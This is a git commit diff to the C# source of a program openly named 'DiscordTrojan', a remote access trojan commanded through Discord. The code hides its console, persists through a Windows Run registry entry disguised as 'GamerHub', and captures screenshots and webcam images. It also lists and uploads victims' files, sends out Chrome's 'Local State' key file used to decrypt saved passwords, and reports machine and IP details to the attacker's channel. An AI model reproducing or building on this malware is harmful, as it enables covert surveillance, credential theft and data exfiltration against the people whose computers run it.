0a81229e8be3b87f0b95c9f7632c57690e4f0f0c
Hugo <54809176+HUGOW04@users.noreply.github.com>
2022-06-25 21:30:19 +0200

    uptate 1.3

--- DiscordTrojan/Program.cs
+++ DiscordTrojan/Program.cs
@@ -1,8 +1,18 @@
 ﻿using System;
 using System.Drawing;
 using System.Threading.Tasks;
+
 using Discord;
 using Discord.WebSocket;
+using Discord.Commands;
+using Discord.Audio;
+using Discord.Rest;
+using Discord.API;
+using Discord.Net;
+using Discord.Interactions;
+using Discord.Webhook;
+
+
 using System.Windows.Forms;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
@@ -12,6 +22,10 @@ using System.IO;
 using AForge.Video;
 using AForge.Video.DirectShow;
 using System.Threading;
+using System.Linq;
+using System.Text;
+using System.Collections.Generic;
+
 
 
 
@@ -19,9 +33,11 @@ using System.Threading;
 
 namespace DiscordTrojan
 {
-    
+
     public class Program
     {
+
+
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
@@ -34,7 +50,7 @@ namespace DiscordTrojan
         string root = @"\AppData\LocalLow";
 
 
-
+        bool target = false;
 
         public static void Main(string[] args)
         => new Program().MainAsync().GetAwaiter().GetResult();
@@ -45,11 +61,12 @@ namespace DiscordTrojan
 
         private DiscordSocketClient _client;
 
-        
+
 
 
         public async Task MainAsync()
-        {         
+        {
+            
             const int SW_HIDE = 0;
             //const int SW_SHOW = 5;
             var handle = GetConsoleWindow();
@@ -83,115 +100,156 @@ namespace DiscordTrojan
             {
                 message.Channel.SendMessageAsync($@"Pong, {message.Author.Mention}");
             }
+
+            if (message.Content == "!Target")
+            {
+                message.Channel.SendMessageAsync("User: " + " " + userPath + "\n");
+            }
+            if (message.Content == "!Target " + userPath)
+            {
+                target = true;
+                message.Channel.SendMessageAsync(" Targeted " + userPath);
+            }
+            if (message.Content == "!Untarget" && target == true)
+            {
+                target = false;
+                message.Channel.SendMessageAsync("Untargetd " + userPath);
+            }
+            if (message.Content == "!Untarget " + userPath && target == false)
+            {
+                message.Channel.SendMessageAsync("You need to target someon in order to untarget!");
+            }
+
             
-            if (message.Content == "!Help" || message.Content == "!HELP" || message.Content == "!help")
+            if (message.Content == "!Join")
             {
-                var help = new EmbedBuilder();
-                help.WithTitle("Help");
-                help.WithDescription("!Ping - Pong\n\n!ScreenShot - show photo of desktop\n\n!Chrome Passwords - returns a enycrypted password sheat\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!Get Files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!Get File (directory) - returns the file you want to download\n\n!StartUp true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera");
-                help.WithColor(Discord.Color.Teal);
-                message.Channel.SendMessageAsync("", false, help.Build());
+                //await _service.JoinAudio(Context.Guild, (Context.User as IVoiceState).VoiceChannel);
+
             }
 
-            if (message.Content == "!ScreenShot")
-            {
-                GetDesktop();
-                message.Channel.SendFileAsync(userPath + root + "\\Capture.jpg");
-                Thread.Sleep(1000);
-                DeleteFunction(userPath + root + "\\Capture.jpg");
-            }
 
-            if (message.Content == "!Chrome Passwords")
-            {
-                message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Local State");
-            }
+            if (target == true) {
 
-            if (message.Content == "!Info")
-            {
-                message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nIp adress: " + GetIp() + "\nOS version: "+ System.Environment.OSVersion+"\nProcessor count: " + System.Environment.ProcessorCount);
-               
-                
-            }
-
-            if (message.Content.StartsWith("!MessageBoxError"))
-            {
-                string arg = message.Content.Replace("!MessageBoxError", " ");
-                MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                message.Channel.SendMessageAsync("Sent and read");
-            }
-            if (message.Content.StartsWith("!MessageBoxWarning"))
-            {
-                string arg = message.Content.Replace("!MessageBoxWarning"," ");
-                MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                message.Channel.SendMessageAsync("Sent and read");
-            }
-
-            if (message.Content.StartsWith("!StartUp true"))
-            {
-                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                key.SetValue("GamerHub", $@"{System.Windows.Forms.Application.ExecutablePath}");
-                message.Channel.SendMessageAsync("StartUp true");
-            }
-
-            if (message.Content.StartsWith("!StartUp false"))
-            {
-                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                key.DeleteValue("GamerHub", false);
-                message.Channel.SendMessageAsync("StartUp false");
-            }
-
-           
-
-            if (message.Content.StartsWith("!Get Files"))
-            {
-                var arg = message.Content.Split(new[] { "!get files" }, StringSplitOptions.None)[1];
-                try
+                if (message.Content == "!Help" || message.Content == "!HELP" || message.Content == "!help")
                 {
-                    string[] filePaths = Directory.GetFiles($@"{arg}", "*", SearchOption.AllDirectories);
-                    string allDir = "";
-                    for (int i = 0; i < filePaths.Length; i++)
-                    {
-                        allDir = string.Concat(allDir, "\n" + filePaths[i]);
-                    }
-                    message.Channel.SendMessageAsync(allDir);
+                    var help = new EmbedBuilder();
+                    help.WithTitle("Help");
+                    help.WithDescription("!Ping - Pong\n\n!Tetris Tetris song\n\n!Annoying play an annoying sound\n\n!ScreenShot - show photo of desktop\n\n!Chrome Passwords - returns a enycrypted password sheat\n\n!Info - shows basic info about the pc and network\n\n!MessageBoxError (message) - sends the user a error message box\n\n!MessageBoxWarning (message) - sends the user a warning message box\n\n!Get Files (directory) - returns all files in dir and in subdirectorys WARNING dont run this in a big folder or else your going to have a bad time.\n\n!Get File (directory) - returns the file you want to download\n\n!StartUp true/false this will add program to startup if you type true\n\n!CameraSnap get a picture with your camera\n\n!Target choose a target to target");
+                    help.WithColor(Discord.Color.Teal);
+                    message.Channel.SendMessageAsync("", false, help.Build());
                 }
-                catch
+                if (message.Content == "!Tetris")
                 {
-                    message.Channel.SendMessageAsync("Directory not valid.");
+                    Console.Beep(1320, 500); Console.Beep(990, 250); Console.Beep(1056, 250); Console.Beep(1188, 250); Console.Beep(1320, 125); Console.Beep(1188, 125); Console.Beep(1056, 250); Console.Beep(990, 250); Console.Beep(880, 500); Console.Beep(880, 250); Console.Beep(1056, 250); Console.Beep(1320, 500); Console.Beep(1188, 250); Console.Beep(1056, 250); Console.Beep(990, 750); Console.Beep(1056, 250); Console.Beep(1188, 500); Console.Beep(1320, 500); Console.Beep(1056, 500); Console.Beep(880, 500); Console.Beep(880, 500); System.Threading.Thread.Sleep(250); Console.Beep(1188, 500); Console.Beep(1408, 250); Console.Beep(1760, 500); Console.Beep(1584, 250); Console.Beep(1408, 250); Console.Beep(1320, 750); Console.Beep(1056, 250); Console.Beep(1320, 500); Console.Beep(1188, 250); Console.Beep(1056, 250); Console.Beep(990, 500); Console.Beep(990, 250); Console.Beep(1056, 250); Console.Beep(1188, 500); Console.Beep(1320, 500); Console.Beep(1056, 500); Console.Beep(880, 500); Console.Beep(880, 500); System.Threading.Thread.Sleep(500);
                 }
-            }
 
-            if (message.Content.StartsWith("!Get File"))
-            {
-                var arg = message.Content.Split(new[] { "!get file" }, StringSplitOptions.None)[1];
-                try
+                if (message.Content == "!Annoying")
                 {
-                    message.Channel.SendFileAsync(arg);
+                    Console.Beep(10000, 5000);
                 }
-                catch
+
+                if (message.Content == "!ScreenShot")
                 {
-                    message.Channel.SendMessageAsync("Directory not valid.");
-                }
-            }
 
 
-            if (message.Content == "!CameraSnap")
-            {
-                try
-                {
-                    CameraSnap();
-                    message.Channel.SendFileAsync(userPath + root + "\\Capture1.jpg");
+                    GetDesktop();
+                    message.Channel.SendFileAsync(userPath + root + "\\Capture.jpg");
                     Thread.Sleep(1000);
-                    DeleteFunction(userPath + root + "\\Capture1.jpg");
+                    DeleteFunction(userPath + root + "\\Capture.jpg");
                 }
-                catch
-                {
 
+                if (message.Content == "!Chrome Passwords")
+                {
+                    message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Local State");
+                }
+
+                if (message.Content == "!Info")
+                {
+                    message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nIp adress: " + GetIp() + "\nOS version: " + System.Environment.OSVersion + "\nProcessor count: " + System.Environment.ProcessorCount);
+
+
+                }
+
+
+                if (message.Content.StartsWith("!MessageBoxError"))
+                {
+                    string arg = message.Content.Replace("!MessageBoxError", " ");
+                    MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    message.Channel.SendMessageAsync("Sent and read");
+                }
+                if (message.Content.StartsWith("!MessageBoxWarning"))
+                {
+                    string arg = message.Content.Replace("!MessageBoxWarning", " ");
+                    MessageBox.Show(arg, "Save error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    message.Channel.SendMessageAsync("Sent and read");
+                }
+
+                if (message.Content.StartsWith("!StartUp true"))
+                {
+                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    key.SetValue("GamerHub", $@"{System.Windows.Forms.Application.ExecutablePath}");
+                    message.Channel.SendMessageAsync("StartUp true");
+                }
+
+                if (message.Content.StartsWith("!StartUp false"))
+                {
+                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    key.DeleteValue("GamerHub", false);
+                    message.Channel.SendMessageAsync("StartUp false");
+                }
+
+
+
+                if (message.Content.StartsWith("!Get Files"))
+                {
+                    var arg = message.Content.Split(new[] { "!get files" }, StringSplitOptions.None)[1];
+                    try
+                    {
+                        string[] filePaths = Directory.GetFiles($@"{arg}", "*", SearchOption.AllDirectories);
+                        string allDir = "";
+                        for (int i = 0; i < filePaths.Length; i++)
+                        {
+                            allDir = string.Concat(allDir, "\n" + filePaths[i]);
+                        }
+                        message.Channel.SendMessageAsync(allDir);
+                    }
+                    catch
+                    {
+                        message.Channel.SendMessageAsync("Directory not valid.");
+                    }
+                }
+
+                if (message.Content.StartsWith("!Get File"))
+                {
+                    var arg = message.Content.Split(new[] { "!get file" }, StringSplitOptions.None)[1];
+                    try
+                    {
+                        message.Channel.SendFileAsync(arg);
+                    }
+                    catch
+                    {
+                        message.Channel.SendMessageAsync("Directory not valid.");
+                    }
+                }
+
+
+                if (message.Content == "!CameraSnap")
+                {
+                    try
+                    {
+                        CameraSnap();
+                        message.Channel.SendFileAsync(userPath + root + "\\Capture1.jpg");
+                        Thread.Sleep(1000);
+                        DeleteFunction(userPath + root + "\\Capture1.jpg");
+                    }
+                    catch
+                    {
+                        message.Channel.SendMessageAsync("No camera found");
+                    }
                 }
             }
             return Task.CompletedTask;
         }
-
 
         void GetDesktop()
         {
@@ -201,19 +259,14 @@ namespace DiscordTrojan
             Graphics captureGraphics = Graphics.FromImage(captureBitmap);
             captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
             captureBitmap.Save(userPath + root + "\\Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
-            
-        }
-
-        void KeyLogger()
-        {
 
         }
 
         // ************************ CAMERA ********************************
         void CameraSnap()
         {
-           Camera camera = new Camera();
-           camera.Show();
+            Camera camera = new Camera();
+            camera.Show();
         }
         void DeleteFunction(string fileNameToDelete = "")
         {
@@ -243,7 +296,7 @@ namespace DiscordTrojan
             }
             throw new Exception("no");
         }
-
+    
 
     }
 }
